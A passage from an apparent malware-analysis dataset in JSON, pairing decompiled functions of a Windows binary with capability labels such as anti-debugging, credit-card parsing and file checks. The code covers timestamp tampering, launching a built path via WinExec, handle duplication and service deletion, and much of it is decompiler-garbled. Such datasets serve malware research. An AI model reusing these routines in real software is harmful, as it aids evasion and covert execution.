-uVar6;\n    puVar15 = &var_12ch;\n    for (uVar7 = uVar6 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {\n        *puVar15 = *puVar10;\n        puVar10 = puVar10 + 1;\n        puVar15 = puVar15 + 1;\n    }\n    for (uVar6 = uVar6 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n        *puVar15 = *puVar10;\n        puVar10 = puVar10 + 1;\n        puVar15 = puVar15 + 1;\n    }\n    uVar6 = 0xffffffff;\n    pcVar13 = 0x407060;\n    do {\n        pcVar12 = pcVar13;\n        if (uVar6 == 0) break;\n        uVar6 = uVar6 - 1;\n        pcVar12 = pcVar13 + 1;\n        cVar1 = *pcVar13;\n        pcVar13 = pcVar12;\n    } while (cVar1 != '\\0');\n    uVar6 = ~uVar6;\n    iVar5 = -1;\n    pcVar13 = &var_12ch;\n    do {\n        pcVar14 = pcVar13;\n        if (iVar5 == 0) break;\n        iVar5 = iVar5 + -1;\n        pcVar14 = pcVar13 + 1;\n        cVar1 = *pcVar13;\n        pcVar13 = pcVar14;\n    } while (cVar1 != '\\0');\n    puVar10 = pcVar12 + -uVar6;\n    puVar15 = pcVar14 + -1;\n    for (uVar7 = uVar6 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {\n        *puVar15 = *puVar10;\n        puVar10 = puVar10 + 1;\n        puVar15 = puVar15 + 1;\n    }\n    uVar6 = uVar6 & 3;\n    bVar16 = uVar6 != 0;\n    for (; uVar6 != 0; uVar6 = uVar6 - 1) {\n        *puVar15 = *puVar10;\n        puVar10 = puVar10 + 1;\n        puVar15 = puVar15 + 1;\n    }\n    puVar9 = &stack0xfffffffc;\n    if ((bVar16) && (puVar9 = &stack0xfffffffc,  !bVar16)) {\n        puVar10 = &stack0xfffffdb4;\n        puVar9 = &stack0xfffffdb4;\n        cVar1 = '\\x10';\n        do {\n            puVar8 = puVar8 + -1;\n            puVar10 = puVar10 + -1;\n            *puVar10 = *puVar8;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    puVar4 = (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(puVar9 + -300, 0);\n    puVar2 = *(puVar9 + 0xc);\n    if (puVar2 == 0xffffffff) {\n        puVar4 = fcn.00402470(*(puVar9 + 8));\n        puVar11 = puVar4;\n        puVar3 = puVar4;\n        if (puVar4 == 0xffffffff) {\n            return 0;\n        }\n    }\n    else {\n        puVar11 = *(puVar9 + -4);\n        puVar3 = puVar2;\n    }\n    if ((puVar3 + 1 < 0) || (puVar3 + 1 >= 0)) {\n        puVar4 = puVar9 + -0x14;\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)\n              (puVar11, puVar9 + -0x24, puVar9 + -0x1c, puVar4 + (puVar3 != 0xffffffff) + 0xec458d2f);\n    if (puVar2 == 0xffffffff) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(puVar11);\n    }\n    return 1;\n}\n",
        "token_count": 1501
    },
    "00402260": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00402260(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x42562c == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.004021e0(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x4072fc, acStack1304, &uStack2112);\n    uStack2088 = 0x407384;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x40739c;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.004011b0(auStack1564, 0x4072f8, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1868
    },
    "00401420": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401468)\n// WARNING: Removing unreachable block (ram,0x0040146f)\n\nuint __cdecl fcn.00401420(uint arg_8h)\n\n{\n    bool bVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    iVar3 = (**0x4255fc)(2, 0);\n    if (iVar3 == -1) {\n        return 0xffffffff;\n    }\n    var_12ch = 0x128;\n    puVar5 = &var_128h;\n    for (iVar4 = 0x49; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    iVar4 = (**0x425600)(iVar3, &var_12ch);\n    pcVar2 = _sym.imp.MSVCRT.dll__stricmp;\n    do {\n        bVar1 = iVar4 == 0;\n        if (bVar1) {\ncode_r0x004014dc:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n            return var_4h;\n        }\n        if ((!bVar1) && (bVar1)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        iVar4 = (*pcVar2)(&var_108h, arg_8h);\n        if (iVar4 == 0) {\n            var_4h = var_124h;\n            goto code_r0x004014dc;\n        }\n        iVar4 = (**0x425604)(iVar3, &var_12ch);\n    } while( true );\n}\n",
        "token_count": 439
    },
    "004019f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.004019f0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00402470(0x407028);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 74
    },
    "00401f60": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401f60(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar1 = fcn.00401420(0x407094);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, iVar1, 0, 0, 0, 2);\n    iVar3 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar2);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 221
    },
    "00403310": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040333f)\n// WARNING: Removing unreachable block (ram,0x00403346)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403310(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    if (iVar1 == -1) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 118
    },
    "00401890": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00401890(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_8h = 0;\n    *(puVar3 + 2) = 0;\n    fcn.004015c0();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00401180();\n        arg_ch_01 = fcn.00401180();\n        arg_ch_02 = fcn.00401180();\n        fcn.004021e0(arg_10h, arg_ch_00);\n        fcn.004021e0(arg_8h, arg_ch_01);\n        fcn.004021e0(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x40703c, &lpBuffer, arg_10h);\n        iVar2 = fcn.00403310(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x407048, &lpBuffer, arg_8h);\n            iVar2 = fcn.00403310(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x407048, &lpBuffer, arg_ch);\n                iVar2 = fcn.00403310(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.004021e0(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 611
    },
    "004049e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404a44) overlaps instruction at (ram,0x00404a40)\n// \n// WARNING: Removing unreachable block (ram,0x00404a86)\n// WARNING: Removing unreachable block (ram,0x00404a93)\n// WARNING: Removing unreachable block (ram,0x00404a44)\n\nvoid fcn.004049e0(void)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t extraout_ECX;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint32_t uVar4;\n    uint *puVar5;\n    bool bVar6;\n    unkbyte10 extraout_ST0;\n    uint var_25fh;\n    uint var_15bh;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_14h;\n    uint hProcess;\n    uint var_ch;\n    uint lParam;\n    uint var_4h;\n    \n    uVar4 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n    fcn.00402e90();\n    uVar2 = fcn.004041e0();\n    bVar6 = (POPCOUNT(uVar2 & 0xff) & 1U) == 0;\n    if (uVar2 != 0) {\n        if ((bVar6) || (!bVar6)) {\n            unaff_EBX = 0;\n            iVar3 = 0x40;\n        }\n        else {\n            uVar4 = *0x3317b43a;\n            *(extraout_ECX + 0x40) = extraout_ST0;\n            iVar3 = extraout_ECX;\n        }\n        *(uVar4 - 0x260) = unaff_EBX;\n        puVar5 = uVar4 - 0x25f;\n        for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        *puVar5 = 0;\n        *(puVar5 + 2) = 0;\n        iVar3 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)(unaff_EBX, uVar4 - 0x260, 0x26, unaff_EBX);\n        if (iVar3 != 0) {\n            fcn.004015c0();\n            *(uVar4 - 0x15c) = unaff_EBX;\n            puVar5 = uVar4 - 0x15b;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            *puVar5 = 0;\n            *(puVar5 + 2) = 0;\n            (*_sym.imp.MSVCRT.dll_sprintf)(uVar4 - 0x15c, 0x4073c4, uVar4 - 0x260, 0x4073a4);\n            *(uVar4 - 0x14) = unaff_EBX;\n            while( true ) {\n                puVar5 = uVar4 - 0x58;\n                for (iVar3 = 0x11; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar5 = 0;\n                    puVar5 = puVar5 + 1;\n                }\n                *(uVar4 - 0x10) = 0;\n                *(uVar4 - 0x58) = 0x44;\n                *(uVar4 - 0xc) = 0;\n                *(uVar4 - 0x2c) = 1;\n                *(uVar4 - 8) = 0;\n                *(uVar4 - 0x28) = unaff_EBX;\n                *(uVar4 - 4) = 0;\n                iVar3 = (*_sym.imp.KERNEL32.dll_CreateProcessA)(0, uVar4 - 0x15c, 0, 0, 0, 0, 0, 0, uVar4 - 0x58);\n                if (iVar3 == 0) break;\n                (*_sym.imp.KERNEL32.dll_Sleep)(3000);\n                (*_sym.imp.USER32.dll_EnumWindows)(fcn.004048d0, *(uVar4 - 8));\n                iVar3 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*(uVar4 - 0x10), 1000);\n                if (iVar3 == 0x102) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(*(uVar4 - 0x10), 1);\n                }\n                pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(*(uVar4 - 0xc));\n                (*pcVar1)(*(uVar4 - 0x10));\n                iVar3 = *(uVar4 - 0x14) + 1;\n                *(uVar4 - 0x14) = iVar3;\n                if (2 < iVar3) {\n                    return;\n                }\n                unaff_EBX = 0;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 1197
    },
    "00401b50": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401b6e) overlaps instruction at (ram,0x00401b6a)\n// \n\nuint __thiscall fcn.00401b50(int32_t param_1, int32_t param_2)\n\n{\n    uint8_t *puVar1;\n    char *pcVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t unaff_BL;\n    uchar **unaff_EBP;\n    uint *unaff_ESI;\n    int32_t *unaff_EDI;\n    uchar in_CF;\n    char in_ZF;\n    uint8_t uStackY65;\n    uchar *puStack4;\n    \n    while (((iVar4 = param_2,  !in_CF && (in_CF)) &&\n           (param_1 = param_1 + -1,  iVar4 = param_1,  param_1 != 0 && in_ZF != '\\0'))) {\n        in_CF = CARRY1(uStackY65, unaff_BL);\n        uStackY65 = uStackY65 + unaff_BL;\n        unaff_EBP = &puStack4;\n        in_ZF = uStackY65 == 0;\n    }\n    uVar5 = *unaff_ESI;\n    *unaff_EDI = unaff_ESI + 1;\n    uVar3 = *0x9750e2b5 | 0x8b;\n    puVar1 = uVar3 - 1;\n    *puVar1 = *puVar1 | iVar4 >> 8;\n    *unaff_EDI = *unaff_EDI + iVar4;\n    pcVar2 = uVar3 + 0x51;\n    *pcVar2 = *pcVar2 + (uVar5 >> 0x1f);\n    puStack4 = unaff_EBP;\n    iVar4 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    if (iVar4 != 0) {\n        uVar5 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar4);\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar4);\n        return uVar5;\n    }\n    return 0;\n}\n",
        "token_count": 488
    },
    "004024c0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402a6a) overlaps instruction at (ram,0x00402a67)\n// \n\nuint fcn.004024c0(void)\n\n{\n    uchar *puVar1;\n    uint8_t uVar2;\n    char **ppcVar3;\n    uint8_t **ppuVar4;\n    uint16_t uVar5;\n    char *pcVar6;\n    uint8_t extraout_AH;\n    uint8_t *puVar7;\n    uint8_t extraout_CL;\n    char extraout_CH;\n    char extraout_CH_00;\n    uint8_t extraout_CH_01;\n    char extraout_CH_02;\n    char *extraout_ECX;\n    uint16_t extraout_DX;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t iVar8;\n    char cVar9;\n    char *unaff_EBX;\n    uint *unaff_EBP;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    ushort in_SS;\n    uchar uVar10;\n    uint8_t uVar11;\n    bool bVar12;\n    uchar uVar13;\n    bool bVar14;\n    ulong uVar15;\n    uint in_stack_ffffffcc;\n    uint in_stack_ffffffd0;\n    uint *puVar16;\n    uint *arg_10h;\n    uint uVar17;\n    uint uVar18;\n    uint uVar19;\n    uchar auStack8 [8];\n    \n    do {\n        puVar16 = unaff_ESI;\n        arg_10h = unaff_EBP;\n        fcn.00403470(0x407014, 0x14, 0x40703c, 10);\n        fcn.00403470(0x407014, 0x14, 0x407048, 0x12);\n        fcn.00403470(0x407014, 0x14, 0x40705c, 4);\n        fcn.00403470(0x407014, 0x14, 0x407060, 0xc);\n        uVar10 = false;\n        cVar9 = unaff_EBX >> 8;\n        uVar13 = cVar9 == '\\0';\n        bVar12 = (POPCOUNT(cVar9) & 1U) == 0;\n        fcn.00403470(0x407014, 0x14, 0x40706c, 7);\n        if ((bVar12) || (!bVar12)) goto code_r0x004025c0;\n        ppcVar3 = segment(in_SS, *0x10 + -0x1c);\n        pcVar6 = *ppcVar3;\n        if (uVar10) {\n            *pcVar6 = *pcVar6 + pcVar6;\n            goto code_r0x004025e3;\n        }\n    } while (bVar12);\n    uVar10 = 0;\n    uVar13 = *0x10 == 0x18;\ncode_r0x004025c0:\n    arg_10h = 0x407074;\n    puVar16 = 0x14;\n    in_stack_ffffffd0 = 0x4025d3;\n    fcn.00403470(0x407014, 0x14, 0x407074, 0xb);\n    if ((uVar10 || uVar13) || (!uVar10 && !uVar13)) {\n        in_stack_ffffffd0 = 0xc;\n        in_stack_ffffffcc = 0x407080;\n    }\n    else {\ncode_r0x004025e3:\n        *unaff_EDI = *unaff_ESI;\n        unaff_EBX = unaff_EBX & 0xffff0000 | CONCAT11(0xdf, unaff_EBX);\n        unaff_EBP = 0x6ae181d0;\n        puVar1 = (&stack0xffffffd4 | 0x68) + 0x40;\n        *puVar1 = *puVar1;\n        unaff_EDI = unaff_EDI + 1;\n    }\n    fcn.00403470(0x407014, 0x14, in_stack_ffffffcc, in_stack_ffffffd0);\n    uVar11 = 0;\n    bVar12 = ((unaff_EDI | 0x2fff) - unaff_EBX ^ 0x7174) < 0;\n    uVar17 = 0x402639;\n    uVar15 = fcn.00403470(0x407014, 0x14, 0x40708c, 8);\n    if ((bVar12) || (!bVar12)) {\n        uVar17 = 0xd;\n        arg_10h = 0x407094;\n        puVar16 = 0x14;\ncode_r0x00402654:\n        pcVar6 = (uVar15 >> 0x20) + 0x14;\n        *pcVar6 = *pcVar6 + extraout_CH;\n        fcn.00403470(0x407014, puVar16, arg_10h, uVar17);\n    }\n    else {\n        if (SCARRY4(uVar15, 0x680d6a2f) == SCARRY4(uVar15 + 0x680d6a2f, uVar11)) goto code_r0x00402654;\n        out(uVar15 >> 0x20, &stack0xffffffe4);\n    }\n    fcn.00403470(0x407014, 0x14, 0x4070a4, 0x18);\n    bVar12 = (POPCOUNT((extraout_CL | unaff_EBX) & unaff_EDI) & 1U) == 0;\n    fcn.00403470(0x407014, 0x14, 0x4070bc, 0x25);\n    if ((!bVar12) && (bVar12)) {\n        puVar16 = &stack0xffffffe4;\n        cVar9 = '\\x1e';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar16 = puVar16 + -1;\n            *puVar16 = *unaff_EBP;\n            cVar9 = cVar9 + -1;\n        } while ('\\0' < cVar9);\n        uVar17 = in(0x78);\n        return uVar17;\n    }\n    uVar18 = 0x4070e4;\n    uVar17 = 0x14;\n    uVar5 = fcn.00403470(0x407014, 0x14, 0x4070e4, 10);\n    uVar5 = ((uVar5 & 0xff | (uVar5 >> 8) - 0x2b << 8) ^ 0x3d) + 0x7c28 ^\n            (extraout_DX & 0xff | (extraout_DX >> 8 | extraout_DX) << 8);\n    bVar12 = uVar5 < 0x4001;\n    bVar14 = uVar5 == 0x4001;\n    uVar19 = 0x40270c;\n    fcn.00403470(0x407014, 0x14, 0x4070f0, 0xc);\n    if ((bVar12 || bVar14) || (!bVar12 && !bVar14)) {\n        uVar19 = 0xd;\n        uVar18 = 0x4070fc;\n        uVar17 = 0x14;\n    }\n    cVar9 = *unaff_EBX;\n    *(unaff_EDI + 0x6a) = *(unaff_EDI + 0x6a) - &stack0xffffffdc;\n    *(extraout_EDX + 0x14) = *(extraout_EDX + 0x14) + (extraout_CH_00 - cVar9);\n    fcn.00403470(0x407014, uVar17, uVar18, uVar19);\n    fcn.00403470(0x407014, 0x14, 0x40710c, 6);\n    fcn.00403470(0x407014, 0x14, 0x407114, 5);\n    fcn.00403470(0x407014, 0x14, 0x40711c, 0xd);\n    fcn.00403470(0x407014, 0x14, 0x40712c, 0x19);\n    bVar12 = false;\n    fcn.00403470(0x407014, 0x14, 0x407148, 0xf);\n    iVar8 = extraout_EDX_00;\n    if (bVar12) goto code_r0x00402810;\n    while( true ) {\n        if (bVar12) {\n            unaff_EBX = unaff_EBX + bVar12 + *(unaff_EBX + iVar8 * 4 + 0x69);\n        }\ncode_r0x00402810:\n        fcn.00403470(0x407014, 0x14, 0x407158, 0xe);\n        bVar12 = false;\n        bVar14 = (POPCOUNT((extraout_CH_01 ^ extraout_AH) + 1 & 0x27) & 1U) == 0;\n        fcn.00403470(0x407014, 0x14, 0x407168, 0xb);\n        if ((bVar14) || (!bVar14)) goto code_r0x00402871;\n        ppuVar4 = segment(in_SS, *0x10 + -0x18);\n        puVar7 = *ppuVar4;\n        iVar8 = -0x4843615b;\n        uVar11 = puVar7;\n        if (bVar12) break;\n        if (!bVar14) goto code_r0x00402871;\n        uVar2 = *unaff_EDI;\n        *unaff_EDI = *unaff_EDI + extraout_ECX;\n        *extraout_ECX = *extraout_ECX + CARRY1(uVar2, extraout_ECX);\n        bVar12 = CARRY1(*puVar7, uVar11);\n        *puVar7 = *puVar7 + uVar11;\n    }\n    out(0x19, puVar7);\n    *puVar7 = *puVar7 + uVar11;\ncode_r0x00402871:\n    fcn.00403470(0x407014, 0x14, 0x407174, 0xb);\n    fcn.00403470(0x407014, 0x14, 0x407180, 0xb);\n    uVar10 = 0;\n    cVar9 = unaff_EBX;\n    uVar19 = 0x40718c;\n    uVar18 = 0x14;\n    fcn.00403470(0x407014, 0x14, 0x40718c, 10);\n    uVar17 = 0x402916;\n    fcn.00403470(0x407014, 0x14, 0x407198, 0xc);\n    if ((uVar10) || (!uVar10)) {\n        uVar17 = 0xe;\n    }\n    bVar12 = false;\n    fcn.00403470(0x407014, 0x14, 0x4071a4, uVar17);\n    if ((!bVar12) && (bVar12)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uVar15 = fcn.00403470(0x407014, 0x14, 0x4071b4, 0x11);\n    iVar8 = uVar15 >> 0x20;\n    if ((SCARRY4(&stack0xffffffb8, 0x40) == &stack0xfffffff8 < 0) &&\n       (SCARRY4(&stack0xffffffb8, 0x40) != &stack0xfffffff8 < 0)) {\n        bVar12 = SBORROW4(iVar8, -0x3797ec96);\n        iVar8 = uVar15;\n        if (!bVar12) goto code_r0x004029bf;\n    }\n    else {\n        unaff_EBX = 0x13;\n        uVar19 = 0x4071c8;\n        uVar18 = 0x14;\n    }\n    *(iVar8 + 0x14) = *(iVar8 + 0x14) + extraout_CH_02;\n    fcn.00403470(0x407014, uVar18, uVar19, unaff_EBX);\n    fcn.00403470(0x407014, 0x14, 0x4071dc, 0x14);\ncode_r0x004029bf:\n    fcn.00403470(0x407014, 0x14, 0x4071f0, 0x33);\n    fcn.00403470(0x407014, 0x14, 0x407224, 10);\n    bVar12 = (POPCOUNT(cVar9 + 1U ^ 0x50) & 1U) == 0;\n    fcn.00403470(0x407014, 0x14, 0x407230, 4);\n    if ((!bVar12) && (bVar12)) {\n        puVar16 = &stack0xffffffe4;\n        cVar9 = '\\x1e';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar16 = puVar16 + -1;\n            *puVar16 = *unaff_EBP;\n            cVar9 = cVar9 + -1;\n        } while ('\\0' < cVar9);\n        uVar17 = in(0x78);\n        return uVar17;\n    }\n    fcn.00403470(0x407014, 0x14, 0x407234, 5);\n    fcn.00403470(0x407014, 0x14, 0x40723c, 0x47);\n    fcn.00403470(0x407014, 0x14, 0x407270, 0x2a);\n    uVar17 = fcn.00403470(0x407014, 0x14, 0x40729c, 0xb);\n    return uVar17;\n}\n",
        "token_count": 3269
    },
    "00403d20": {
        "rules": [
